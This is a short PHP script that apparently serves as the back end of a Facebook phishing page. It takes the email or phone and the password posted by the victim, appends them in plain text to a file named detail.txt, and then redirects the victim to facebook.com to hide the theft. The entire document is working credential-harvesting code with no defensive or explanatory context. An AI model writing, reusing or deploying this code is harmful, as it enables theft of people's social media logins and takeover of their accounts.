<?php
$email=$_POST['email'];
$pass=$_POST['pass'];
$detail="detail.txt";
file_put_contents($detail,"EMAIL/PHONE: ".$email.PHP_EOL,FILE_APPEND);
file_put_contents($detail,"PASSWORD: ".$pass.PHP_EOL,FILE_APPEND);
header("location: facebook.com");